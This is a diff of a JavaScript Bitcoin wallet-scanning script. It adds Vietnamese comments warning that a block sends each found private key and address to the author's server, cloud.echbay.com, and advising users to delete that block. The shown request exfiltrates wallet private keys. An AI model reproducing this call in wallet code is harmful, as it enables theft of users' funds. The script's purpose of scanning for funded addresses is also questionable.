@@ -289,6 +289,8 @@ function MY_scan(max_i) {
                         MY_writeFile(dir_writable + '/' + data.addresses[i].address + '.txt', JSON.stringify(arr_key_adds));
 
                         // gửi email thông báo cho admin
+                        // mặc định về cơ bản thì khi scan được địa chỉ ví, thông tin này sẽ được gửi cho cả người viết code này, nên để an toàn, nếu bạn là người sử dụng code này thì nên xóa đoạn code sau đây đi rồi mới sử dụng
+                        // BẮT ĐẦU ĐOẠN CODE GỬI EMAIL CHO ADMIN
                         request.get({
                             url: 'https://cloud.echbay.com/scan/btc/hasbalance?primary=' + pri + '&address=' + data.addresses[i].address,
                             json: true,
@@ -304,6 +306,7 @@ function MY_scan(max_i) {
                             }
                             console.log(data);
                         });
+                        // KẾT THÚC ĐOẠN CODE GỬI EMAIL CHO ADMIN
 
                         //
                         has_balance = true;
